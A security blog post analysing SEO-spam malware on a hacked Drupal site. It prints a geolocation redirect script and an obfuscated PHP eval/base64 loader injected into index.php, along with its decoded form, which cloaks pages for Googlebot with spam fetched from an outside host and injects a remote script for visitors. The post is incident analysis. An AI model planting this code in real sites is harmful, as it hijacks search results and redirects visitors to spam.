<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="author" content="Benjamin Lim">
  <meta name="description" content="Just encountered a rather interesting redirection malware. The first sign that something was wrong was that the search engine results on Google had...">

  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
  
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.8/css/bootstrap.min.css" type="text/css" media="all">
  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css">
  <link rel="stylesheet" href="../theme/css/style.css" type="text/css" media="all">
  <link rel="stylesheet" href="../theme/css/pygments.css" type="text/css" media="all">
  
  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.8/js/bootstrap.min.js"></script>

  <link rel="stylesheet" href="../theme/css/cookies-eu-banner.default.css" type="text/css" media="all">
  <script src="../theme/js/cookies-eu-banner.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/darkmode-js@1.5.7/lib/darkmode-js.min.js"></script>
 

  <link href="https://limbenjamin.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="limbenjamin Full Atom Feed" />

<meta name="keywords" content="limbenjamin, Security">

<meta property="og:title" content="Drupal Redirect Malware">
<meta property="og:type" content="website">
<meta property="og:image" content="http://limbenjamin.com/media/drupal_redirect_malware.png"/>
<meta property="og:image:secure_url" content="https://limbenjamin.com/media/drupal_redirect_malware.png"/>
<meta property="og:site_name" content="https://limbenjamin.com">
<meta property="og:description" content="Just encountered a rather interesting redirection malware. The first sign that something was wrong was that the search engine results on Google had spammy metadata. This may not be an actual compromise as it could have been caused by issues such as spammers submitting fake sitemaps to Google. While accessing …">
<meta property="og:url" content="https://limbenjamin.com/articles/drupal-redirect-malware.html">
<meta property="fb:admins" content="557193263"/>
<meta property="fb:app_id" content="520142688161055"/>


  <title>Drupal Redirect Malware</title>
  
</head>

<body class="home blog">
    <div id="cookies-eu-banner" style="display: none;position:fixed;bottom: 0">
        We use Google Analytics to analyze our traffic. By clicking "Accept", you consent to our use of cookies.
        <a href="../pages/privacy-policy-disclaimer.html" id="cookies-eu-more">Read more</a>
        <button id="cookies-eu-reject">Reject</button>
        <button id="cookies-eu-accept">Accept</button>
    </div>

  <div>
    <header class="site-header">
      <nav class="navbar navbar-expand-lg navbar-light">
        <div class="container">
          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
          </button>
          <div class="collapse navbar-collapse navbar-default" id="navbarSupportedContent">
            <ul class="navbar-nav me-auto mb-2 mb-lg-0">
              <li class="nav-item"><a class="nav-link" href="/index.html" >Index
<i class=" fa-lg"></i></a></li>
              <li class="nav-item"><a class="nav-link" href="/pages/about-me.html" >About me
<i class=" fa-lg"></i></a></li>
              <li class="nav-item"><a class="nav-link" href="/files/cv.html" >Résumé
<i class=" fa-lg"></i></a></li>
              <li class="nav-item"><a class="nav-link" href="/pages/projects.html" >Projects
<i class=" fa-lg"></i></a></li>
              <li class="nav-item"><a class="nav-link" href="/pages/reading-list.html" >Reading List
<i class=" fa-lg"></i></a></li>
            </ul>
            <div class="d-flex">
                <a class="nav-link" href="#mail" title="Email" >
<i class="fa-solid fa-envelope fa-lg"></i></a><div style="padding-right: 1em;"></div>
                <a class="nav-link" href="https://bugcrowd.com/h/limbenjamin" title="Bugcrowd" >
<i class="fa-brands fa-bimobject fa-lg"></i></a><div style="padding-right: 1em;"></div>
                <a class="nav-link" href="https://sg.linkedin.com/in/1imbenjamin" title="LinkedIn" >
<i class="fa-brands fa-linkedin fa-lg"></i></a><div style="padding-right: 1em;"></div>
                <a class="nav-link" href="https://github.com/limbenjamin" title="GitHub" >
<i class="fa-brands fa-github fa-lg"></i></a><div style="padding-right: 1em;"></div>
               <div class="oval">
                <center>
                  <img src="/files/nricspecimengen/merlion.png" class="merlion" style="height: 30px;"/>
                </center>
               </div> 
            </div>
          </div>
        </div>
      </nav>

    <div class="container">
      <div id="logo">
        <span class="site-name"><a class="navbar-brand" href=".."><svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"   width="233.45px" height="184.71px" viewBox="0 0 233.45 184.71" enable-background="new 0 0 233.45 184.71" xml:space="preserve"><ellipse id="c1" fill="none" cx="60.2" cy="57.5" rx="3.6" ry="3.1"/><ellipse id="c2" fill="none" cx="56.4" cy="103.3" rx="3.3" ry="3.2"/><ellipse id="c3" fill="none" cx="99.8" cy="121.7" rx="3.3" ry="3.1"/><ellipse id="c4" fill="none" cx="151.8" cy="124.9" rx="3.3" ry="2.8"/><ellipse id="c5" fill="none" cx="172.5" cy="87" rx="3.8" ry="2.9"/><ellipse id="c6" fill="none" cx="176.8" cy="41.1" rx="3.5" ry="3.1"/><ellipse id="c7" fill="none" cx="132.8" cy="23.3" rx="3.4" ry="3.2"/><ellipse id="c8" fill="none" cx="81.3" cy="19.8" rx="3.7" ry="3.4"/><path id="path4" fill="#FFF" stroke="#C4E6FC" stroke-width="12" stroke-miterlimit="10" d="M86 58l10-8s10-3 11-1c1 1-7 7-7 7L88 67v4c1 1 2 3 3 2l21-18 10-5h7L89 85l1 4 2 4c3 0 42-38 46-41h4l2 4-1 3-38 33-2 3 5 2 5-1c8-6 20-25 30-25l1 2 1 1-1 4s-19 12-17 18l5 1 4-2 6-4 5-4"/>    <path id="path3" fill="none" stroke="#0e94ec" stroke-width="9" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M114 85l-7 1-2-8h-2l11-1-12-10 13 2-7-6 8 1-7-5h3l5 2 6-2 2 5 5 3-9 3 7 1-8 4 9 2 1 3h-6l-4 1v4l3 2 4-3"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M64 139v15c0 5 3 8 7 8 5 1 9-2 10-6s-1-7-7-9l-7 2M154 163c-1-4 1-8-1-13-2-2-6-3-10-3-4 1-7 7-5 10 2 5 8 7 12 5l3-3"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M116 15c2 10 0 19 1 29M117 101c-1 9 1 19-1 29M183 72h-34M84 72H52"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M131 147v17c1 4-2 6-6 5M101 160c-6 3-9 3-14-2v-7c2-3 6-5 10-4s6 4 7 7l-16 1M15 140v23"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M84 87c-6-1-11 0-14 5l-11 8c1 3 1 6-3 7-3-2-3-2-3-6h6M133 101v7l16 14M174 44c4 1 4 1 7-2l-3-4c-5 0-6 1-4 6l-12 10c-4 4-8 5-13 4M85 23l8 7c6 4 7 9 7 14M85 49c-1 10 0 19 1 29v15c0 4 3 6 8 6l22 1 25-1"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M110 163v-7c0-6 0-7 7-9 6 0 8 4 7 8v8"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M84 23c0-2 2-4 0-6-3-1-5-1-7 2 1 4 3 5 7 4"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M175 150c2-2 5-4 9-3 4 2 5 5 5 8s1 5-1 8M43 150c3-2 5-4 9-3 5 2 5 5 5 8v8M204 150c2-2 5-3 8-3 9 3 5 10 6 16"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M100 101v16M133 27c-2 0-3-1-4-3 0-2 1-4 5-4 2 0 2 2 3 4-4 2-4 6-4 10v10M64 58c0 2-1 3-3 3-3 0-4-2-5-3l4-4 1 1c4 4 9 3 13 3h10M90 47l4-1h46s4 0 7 5v13a425 425 0 01-1 34"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M196 147v16M22 147c0 5-1 10 1 16"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M106 82c-3-1-4 1-4 3 1 3 3 5 7 5 3 1 5-1 7-2M131 73c5 4 6 7 2 10l-3 3c-1 4-5 5-9 4-4 0-5-3-5-6l1-18M121 62l6-1v-6c-4-1-7-1-10 2M128 61c8 3 9 6 4 12M173 84c5 2 5 3 0 6-3 0-3-2-5-3 0 0 2-3 4-3M116 60c2-4-1-6-5-5-4 0-7 1-6 6"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M43 163v-9c0-2 0-5-3-6s-6-1-9 1l-2 2c1 4-1 8 1 12M175 163v-9c0-2 0-5-4-6-3-1-6-1-8 1l-2 2v12M203 147v16"/><path class="path" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M108 101c0 3 1 6-1 9M125 34v10M84 65H73M84 80H73M109 34l-1 10M99 118c-3 1-3 3-2 5s3 2 5 1c2-2 2-5-2-6M106 61c-9 2-10 5-6 11M125 101v7M104 71c-8 4-8 8-2 13M150 122c-3 3-3 3 1 6 3 0 4-1 5-3-1-3-3-3-5-3M149 65h12M150 81h11M169 87h-19"/><path class="path2" fill="none" stroke="#000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M22 144v-1M132 144v-1M196 144v-1"/></svg></a>
        </span><!-- end of .site-name -->
      </div><!-- end of #logo -->
        <div class="tagline">
                <a href="../tag/coding.html" >Coding (13)</a> &#124; 
                <a href="../tag/data.html" >Data (25)</a> &#124; 
                <a href="../tag/legal.html" >Legal (41)</a> &#124; 
                <a href="../tag/nus.html" >NUS (3)</a> &#124; 
                <a href="../tag/security.html" >Security (123)</a> &#124; 
                <a href="../tag/server.html" >Server (32)</a> &#124; 
                <a href="../tag/untagged.html" >Untagged (20)</a> &#124; 
                <a href="../archives.html" >Archives (218)</a>
        </div>
    </div>

  </header><!-- #masthead -->
  </div>
    <div id="content" class="site-content">
      <div class="container main-content-area">
        <div class="row">
          <div class="main-content-inner col-sm-12 col-md-12">
            <div id="primary" class="content-area">
              <div id="main" class="site-main" role="main">
                <div class="article-container">
<article>
  <div class="blog-item-wrap">
    <div class="post-inner-content">
      <header class="entry-header page-header">
        <span class="cat-item"><time datetime="2023-03-18 09:03:00+08:00">Mar 18, 2023</time></span>
        <h1 class="entry-title-single-page"><a href="../articles/drupal-redirect-malware.html">Drupal Redirect Malware</a></h1>
      </header><!-- .entry-header -->
      <div class="entry-content">
        <p>Just encountered a rather interesting redirection malware. The first sign that something was wrong was that the search engine results on Google had spammy metadata. This may not be an actual compromise as it could have been caused by issues such as spammers submitting fake sitemaps to Google. While accessing the site, it loaded fine. However, the redirection failed sporadically and I managed to find the following external javascript file embedded onto the site. This was the first sign that the website was truly hacked.  </p>
<p><img alt="image" src="//limbenjamin.com/media/drupal_redirect_malware.png"></p>
<p>I pulled down the javascript file and found that it checked the country code of your IP address and redirected you to www(.)hmbags(.)tw if you happened to have a Taiwan IP. Perhaps the ip-api.com connection timed out occasionally hence giving me the opportunity to catch the redirection happening.  </p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span>
<span class="normal">44</span>
<span class="normal">45</span>
<span class="normal">46</span>
<span class="normal">47</span>
<span class="normal">48</span>
<span class="normal">49</span>
<span class="normal">50</span>
<span class="normal">51</span>
<span class="normal">52</span>
<span class="normal">53</span>
<span class="normal">54</span>
<span class="normal">55</span>
<span class="normal">56</span>
<span class="normal">57</span>
<span class="normal">58</span>
<span class="normal">59</span>
<span class="normal">60</span>
<span class="normal">61</span>
<span class="normal">62</span>
<span class="normal">63</span></pre></div></td><td class="code"><div><pre><span></span><code>    function ajax(options) {
        options = options || {};
        options.type = (options.type || &quot;GET&quot;).toUpperCase();
        options.dataType = options.dataType || &quot;json&quot;;
        var params = formatParams(options.data);
        var xhr;
        if (window.XMLHttpRequest) {
            xhr = new XMLHttpRequest();
        } else if (window.ActiveObject) {
            xhr = new ActiveXobject(&#39;Microsoft.XMLHTTP&#39;);
        }
        if (options.type == &quot;GET&quot;) {
            xhr.open(&quot;GET&quot;, options.url, true);
            xhr.send(null);
        } else if (options.type == &quot;POST&quot;) {
            xhr.open(&quot;post&quot;, options.url, true);
            xhr.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
            xhr.send(params);
        }
        setTimeout(function() {
            if (xhr.readySate != 4) {
                xhr.abort();
            }
        }, options.timeout)
        xhr.onreadystatechange = function() {
            if (xhr.readyState == 4) {
                var status = xhr.status;
                if (status &gt;= 200 &amp;&amp; status &lt; 300 || status == 304) {
                    options.success &amp;&amp; options.success(xhr.responseText, xhr.responseXML);
                } else {
                    options.error &amp;&amp; options.error(status);
                }
            }
        }
    }

    function formatParams(data) {
        var arr = [];
        for (var name in data) {
            arr.push(encodeURIComponent(name) + &quot;=&quot; + encodeURIComponent(data[name]));
        }
        arr.push((&quot;v=&quot; + Math.random()).replace(&quot;.&quot;, &quot;&quot;));
        return arr.join(&quot;&amp;&quot;);
    }
    ajax({
        url: &quot;https://pro.ip-api.com/json?key=FMjb5N6z7rcJ8yt&quot;,
        type: &#39;get&#39;,
        dataType: &#39;json&#39;,
        timeout: 10000,
        contentType: &quot;application/json&quot;,
        success: function(data) {
            var location = JSON.parse(data);
            if (location.countryCode === &quot;TW&quot;) {
                window.location.href = &quot;https :// www. hmbags . tw /&quot;;
            } else {
                window.location.href = &quot;&quot;;
            }
            console.log(JSON.parse(data));
        },
        error: function(e) {
            console.log(e);
        }
    })
</code></pre></div></td></tr></table></div>

<p>Inspecting the contents of hmbags(.)tw on VirusTotal revealed that it is indeed responsible for the spammy content.  </p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span>
<span class="normal">5</span>
<span class="normal">6</span>
<span class="normal">7</span></pre></div></td><td class="code"><div><pre><span></span><code>威而鋼

美國原廠正品威而鋼viagra·複燃男人的希望. 【鄭重聲明】 本站商品出貨包裝絕對隱秘，不會出現任何敏感的字眼！ 威而鋼官方logo.
樂威壯(Levitra)效果明顯免處方為什麼男人會陽痿？

性欲是男性勃起機制中的關鍵。性慾強度影響男性荷爾蒙的分泌。而男性荷爾蒙誘使腦部釋放神經傳導物質向下傳導到脊髓的副交感神經核。再經陰莖海綿體神經的神經末梢及 ...
Rating: 5 · ‎1 review · ‎NT$1,480.00
</code></pre></div></td></tr></table></div>

<p>Having confirmed that the website was indeed hacked, I was given access to the Drupal installation and tasked to clean up. Having cPanel access would have made it easier but Drupal does have modules available to perform file management. A little while later, I found the file which was modified (index.php) and managed to clean out the code. The attacker inserted an additional function which was decoded to reveal the following functions.  </p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal">  1</span>
<span class="normal">  2</span>
<span class="normal">  3</span>
<span class="normal">  4</span>
<span class="normal">  5</span>
<span class="normal">  6</span>
<span class="normal">  7</span>
<span class="normal">  8</span>
<span class="normal">  9</span>
<span class="normal"> 10</span>
<span class="normal"> 11</span>
<span class="normal"> 12</span>
<span class="normal"> 13</span>
<span class="normal"> 14</span>
<span class="normal"> 15</span>
<span class="normal"> 16</span>
<span class="normal"> 17</span>
<span class="normal"> 18</span>
<span class="normal"> 19</span>
<span class="normal"> 20</span>
<span class="normal"> 21</span>
<span class="normal"> 22</span>
<span class="normal"> 23</span>
<span class="normal"> 24</span>
<span class="normal"> 25</span>
<span class="normal"> 26</span>
<span class="normal"> 27</span>
<span class="normal"> 28</span>
<span class="normal"> 29</span>
<span class="normal"> 30</span>
<span class="normal"> 31</span>
<span class="normal"> 32</span>
<span class="normal"> 33</span>
<span class="normal"> 34</span>
<span class="normal"> 35</span>
<span class="normal"> 36</span>
<span class="normal"> 37</span>
<span class="normal"> 38</span>
<span class="normal"> 39</span>
<span class="normal"> 40</span>
<span class="normal"> 41</span>
<span class="normal"> 42</span>
<span class="normal"> 43</span>
<span class="normal"> 44</span>
<span class="normal"> 45</span>
<span class="normal"> 46</span>
<span class="normal"> 47</span>
<span class="normal"> 48</span>
<span class="normal"> 49</span>
<span class="normal"> 50</span>
<span class="normal"> 51</span>
<span class="normal"> 52</span>
<span class="normal"> 53</span>
<span class="normal"> 54</span>
<span class="normal"> 55</span>
<span class="normal"> 56</span>
<span class="normal"> 57</span>
<span class="normal"> 58</span>
<span class="normal"> 59</span>
<span class="normal"> 60</span>
<span class="normal"> 61</span>
<span class="normal"> 62</span>
<span class="normal"> 63</span>
<span class="normal"> 64</span>
<span class="normal"> 65</span>
<span class="normal"> 66</span>
<span class="normal"> 67</span>
<span class="normal"> 68</span>
<span class="normal"> 69</span>
<span class="normal"> 70</span>
<span class="normal"> 71</span>
<span class="normal"> 72</span>
<span class="normal"> 73</span>
<span class="normal"> 74</span>
<span class="normal"> 75</span>
<span class="normal"> 76</span>
<span class="normal"> 77</span>
<span class="normal"> 78</span>
<span class="normal"> 79</span>
<span class="normal"> 80</span>
<span class="normal"> 81</span>
<span class="normal"> 82</span>
<span class="normal"> 83</span>
<span class="normal"> 84</span>
<span class="normal"> 85</span>
<span class="normal"> 86</span>
<span class="normal"> 87</span>
<span class="normal"> 88</span>
<span class="normal"> 89</span>
<span class="normal"> 90</span>
<span class="normal"> 91</span>
<span class="normal"> 92</span>
<span class="normal"> 93</span>
<span class="normal"> 94</span>
<span class="normal"> 95</span>
<span class="normal"> 96</span>
<span class="normal"> 97</span>
<span class="normal"> 98</span>
<span class="normal"> 99</span>
<span class="normal">100</span>
<span class="normal">101</span>
<span class="normal">102</span>
<span class="normal">103</span>
<span class="normal">104</span>
<span class="normal">105</span>
<span class="normal">106</span>
<span class="normal">107</span>
<span class="normal">108</span>
<span class="normal">109</span>
<span class="normal">110</span>
<span class="normal">111</span></pre></div></td><td class="code"><div><pre><span></span><code>&lt;?php function yYVg($aQt)
{ 
$aQt=gzinflate(base64_decode($aQt));
 for($i=0;$i&lt;strlen($aQt);$i++)
 {
$aQt[$i] = chr(ord($aQt[$i])-1);
 }
 return $aQt;
 }eval(yYVg(&quot;7ZZtb+o2FIC/k1/hRWhOVJpAt3VbuekVatNbJFpYCHebJhS5wTTuDXHkmALj9rfv2OGtjI57P2yfhiLinJw3P8c+DkL6Z1AhuIgEzbmQLHu06nbTKKiMJJvQKGUTJrWo+okuPFSN+n7w0Q/+MG/DsBcN4ClqffDvQ3MIKg9ceqyIipyNqLCUkaBjJYEbFVREBSUiTvSbhBcyysiEIg+ZiZT5heuazsY/1v5vu/0QD3ekvdsejDs3WIV7mk7ymI+oZ74rYsFyieQipx6WdC7dJ/JMSilGhYg9rGIUEGQ2mzlxQviC5ST+5MR84srZgnDnqcCX79zS5tJsGmxsbQMH/i8Dvx9Gg6CNh57nma5pG0vAhxDoFVLkvLAUoxp+5Pwxpdj+xvPGJC2oDTpLzboaXgMC8UyFZ67TmbPMmZH8+VlnAmErAK0AKPFUpN2cZtbWynkjH8d0WTaicydP8vcKrAckN4Ad89sRnxCWebt8y3t037rz8RAKUkkoUVUzr3gmaSZPQ2B5gTTLRE7SJgJoAhaGN5Xj059MZULjhCOVLoxHjKq6IvRiaCoIUZi7HiyNCtKY9HLwGrZ+BunKwbqO4GXtRiloT+r/xVCudjAfplBDuEh4jm0E5JFG//nzUZOHlD9+pUku+Ggay12rf2MtZJQtqCrp/4vi4KIYT7NYMp4dgmIjKAhoVuPkbIUtYhm0MrupxPoZ0ua5tJRKDV0Ngk63p9B1aug/gfvPeaj2d+u3rv2ghogQZGHh305vusGvreDav1aji/Nz5+z7n50fv3POGg1cw1edNjTi03Zv7419NNYqTrlCjyj3+50IptG++b3n7xh9oY1q6F9mE/jhILgPg9Z9/0bFaRxLLPBBDzTx6jBRfb7cfmo34aOFh/Lok6yG7/ifLE2J+4NTP7HANieSPaS0efJBu4NTzj1zGs2Tk4ORXHjvqM1hH40Ztu/87iCsnddLzWpcbrP1To/onMbaZsdTnPKC7ggFlVORbW1BuLM3do5jY6naiMw+ktSrw26SYmFU1IarFhF5BFMPGmg5usAOtDHJUz4Dy71DeXvolz2iAhcbo03jW/mARrnufpd1UKlsO+tW4wG+OICXUoEGoLPZ5NhQvl8MdcVExgmy/HlMcz2t6sxegnw999KiCRN/NfP9z443CUAbYgWUyNr7vlmtKXNob7PbuEWa1+rhDWL7btSUNLA9Yisvf2P2CtpWSWHTKujI77D5giScr5mX03pNXTH/avTvL/8C&quot;));?&gt;

### decoded version ###

error_reporting(0);
set_time_limit(0);
$key= $_SERVER[&quot;HTTP_USER_AGENT&quot;];
$bot=is_spider();
$ref=is_referer_search();
$host_name = &quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;PHP_SELF&#39;];
$jumpcode=&quot;&lt;script type=&#39;text/javascript&#39; src=&#39;https://www.chaoyipack.com/twyao.js&#39;&gt;&lt;/script&gt;&quot;;
if($_SERVER[&#39;REQUEST_URI&#39;]===&quot;/&quot;)
{  
  if(strpos($key,&#39;google&#39;)!==false)
  {     $TD_server=&quot;https://xin.wapvv.com/&quot;;
    $res = curlOpen($TD_server.$_SERVER[&#39;REQUEST_URI&#39;].&quot;/index.php?host=&quot;.$host_name.&quot;&amp;domain=&quot;.$_SERVER[&#39;SERVER_NAME&#39;]);
    header(&quot;Content-Type: text/html; charset=utf-8&quot;);
    echo $res;
    die();
  }

    else
    {
       if($ref==1)
       {
        echo $jumpcode;
        die();
        }
    }
}
elseif(strpos($_SERVER[&#39;REQUEST_URI&#39;], &#39;shop&#39;) !== false||strpos($_SERVER[&#39;REQUEST_URI&#39;], &#39;blog&#39;) !== false||strpos($_SERVER[&#39;REQUEST_URI&#39;], &#39;product&#39;) !== false)
{  
  if(strpos($key,&#39;google&#39;)!==false)
  {     $TD_server=&quot;https://xin.wapvv.com/neiye.php&quot;;
    $res = curlOpen($TD_server.$_SERVER[&#39;REQUEST_URI&#39;].&quot;/index.php?host=&quot;.$host_name.&quot;&amp;domain=&quot;.$_SERVER[&#39;SERVER_NAME&#39;]);
    header(&quot;Content-Type: text/html; charset=utf-8&quot;);
    echo $res;
    die();
  }

    else
    {
       if($ref==1)
       {
        echo $jumpcode;
        die();
        }
    }
}
function curlOpen($TD_server) 
{ 
  $ch2 = curl_init(); 
  curl_setopt($ch2, CURLOPT_URL, $TD_server.$_SERVER[&#39;REQUEST_URI&#39;].&quot;/index.php?host=&quot;.$host_name.&quot;&amp;domain=&quot;.$_SERVER[&#39;SERVER_NAME&#39;]); 
  curl_setopt($ch2, CURLOPT_HTTPHEADER, array(&#39;X-FORWARDED-FOR:66.249.73.211&#39;,&#39;CLIENT-IP:66.249.73.211&#39;)); 
  curl_setopt($ch2, CURLOPT_HEADER, false); 
  curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, false);
  curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1); 
  curl_setopt($ch2, CURLOPT_REFERER,&#39;http://www.google.com&#39;); 
  curl_setopt($ch2, CURLOPT_USERAGENT,&#39;Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html)&#39;); 
  curl_setopt($ch2, CURLOPT_TIMEOUT,60); 
  $contents = curl_exec($ch2); 
  curl_close($ch2); 
  return $contents; 
}
function is_spider()
{
    $rtnVal=0;
    try
    {
        $s_agent= &#39;s_agent:&#39;.strtolower($_SERVER[&#39;HTTP_USER_AGENT&#39;]);

        if (strpos($s_agent, &#39;google&#39;)&gt;0
            ||strpos($s_agent, &#39;bingbot&#39;)&gt;0)
        {
            $rtnVal=1;
        }
    }
    catch (Exception $w){}
    return $rtnVal;
}

function is_referer_search()
{
    $rtnVal=0;
    try
    {
        if(isset($_SERVER[&quot;HTTP_REFERER&quot;]))
        {
            $s_referer = &#39;s_referer:&#39;.strtolower($_SERVER[&quot;HTTP_REFERER&quot;]);

            if (strpos($s_referer, &#39;google&#39;)&gt;0
                ||strpos($s_referer, &#39;bing&#39;)&gt;0
                                ||strpos($s_referer, &#39;yahoo&#39;)&gt;0)
            {
                $rtnVal=1;
            }
        }
    }
    catch (Exception $w){}
    return $rtnVal;
}
?&gt;
</code></pre></div></td></tr></table></div>

<p>In summary, if Google was crawling the homepage, the contents of <code>https://xin(.)wapvv(.)com/</code> would be served which contains the same spammy content earlier seen on <code>www(.)hmbags(.)tw</code>. If Google was crawling any URL with shop/blog/product, <code>https://xin(.)wapvv(.)com/neiye.php</code> would be served instead. This explains the hijacked search results. A normal visitor would be served the twyao(.)js javascript file. The javascript file will redirect users from Taiwan to the <code>www(.)hmbags(.)tw</code> website.  </p>
<p>Note: if you are following through the code, the <code>is_spider()</code> and <code>is_referer_search()</code> is superfluous code which have no effect on the outcome.  </p>
      </div><!-- .entry-content -->
      <br /><br />
      <div class="article_meta">
        Tags:
          <a href="../tag/security.html">Security</a>        <br />
        <div class="similararticleline"></div>
        <h2>Similar Articles</h2>
          <div class="similararticlerow">
              <blockquote class="similar_posts">
              <a href="../articles/on-physical-authentication.html"><b>On Physical Authentication - </b>
              Recently, I moved into a new environment and had the opportunity to witness a number of processes. This experience further reinforced in me the importance of policies over technical measures. ...</a>
              </blockquote>
              <blockquote class="similar_posts">
              <a href="../articles/flare-on-6-solve-vv-max-by-hand.html"><b>FLARE-On 6 - Solve vv_max by hand - </b>
              After looking at the published solutions for FLARE-On 6, I realised that for challenge 11, vv_max, most people used a script to either reverse the AVX functions or to brute force it. My approach ...</a>
              </blockquote>
              <blockquote class="similar_posts">
              <a href="../articles/tips-for-winning-sans-ctfs.html"><b>Tips for winning SANS CTFs - </b>
              Over the past 3 years, I have attended 3 SANS courses and participated in 3 NetWars events. I have won the challenge coin for every event I participated in. I hope this gives a bit more ...</a>
              </blockquote>
              <blockquote class="similar_posts">
              <a href="../articles/dumping-aztech-DSL1015EN-firmware.html"><b>Dumping Aztech DSL1015EN firmware - </b>
              Recently, I had the fortune to come across a spare DSL1015EN router cum modem. After dismantling the external case, this is what the internals look like. On the left, we can see 2 u.fl connectors ...</a>
              </blockquote>
          </div>
      </div>
      <br />
    </div>
  </div>
</article><!-- #post-## -->
                </div>
              </div><!-- #main -->
          </div><!-- #primary -->
        </div>
      </div><!-- close .row -->
    </div><!-- close .container -->
  </div><!-- close .site-content -->

  <div id="mail" class="overlay">
    <div class="popup">
      <a class="close" href="#">&times;</a>
      <div id="popup_content">
      </div>
    </div>
  </div>

  <div id="footer-area">
    <footer id="colophon" class="site-footer" role="contentinfo">
      <div class="site-info container">
        <div class="row">
                    <div class="copyright col-md-12">
                    <a href="../pages/privacy-policy-disclaimer.html">Privacy & Disclaimer</a> | 
                    <a href="../feeds/all.atom.xml">Atom Feed</a> | 
                    <a href="../sitemap.xml">Sitemap</a><br />
                    This site uses the <a href="https://github.com/limbenjamin/voce">voce</a> theme by <a href="//limbenjamin.com/">Benjamin Lim</a><br />
                    Page generated on Fri Jan  2 15:21:36 2026<br />
                    &copy; 2012-2026 <a href="..">Benjamin Lim</a> </div>
        </div>
      </div><!-- .site-info -->
      <div class="scroll-to-top" style="display: none;"><i class="fa-solid fa-angle-up"></i></div><!-- .scroll-to-top -->
      <div class="dark-mode" style="display: block;"><i class="fa-solid fa-moon"></i></div><!-- .dark-mode -->
    </footer><!-- #colophon -->
  </div>

  <script>
    const darkmode =  new Darkmode();  
  </script>
  <script type="text/javascript">
    window.addEventListener('load', function(){    
    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
      window.scroll(0, document.getElementById('main').offsetTop);
    }})
  </script>


  <script type="text/javascript" src="../theme/js/functions.min.js"></script>




<!-- Google tag (gtag.js) -->
